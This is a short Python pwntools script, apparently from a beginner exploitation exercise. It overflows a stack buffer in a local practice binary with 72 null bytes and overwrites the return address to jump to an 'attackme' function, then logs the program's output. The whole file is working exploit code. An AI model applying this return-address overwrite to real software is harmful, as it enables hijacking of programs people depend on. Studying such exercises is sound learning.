#!/usr/bin/python
from pwn import *
from time import sleep

p = process('./demo1')

ret = 0x04005b6  #/xb6/x05/x40/x00
log.info("addr of attackme = " + hex(ret))

payload = "\x00" * 72 + p64(ret)

p.sendline(payload)
log.info("-- sending -- payload -- biu~~~")

f = open('payload','w')
f.write(payload)
f.close()

log.info("waiting for 3s ...")
sleep(3)

log.info("recv1: " + p.readline())
sleep(1)
log.info("recv2: " + p.readline())
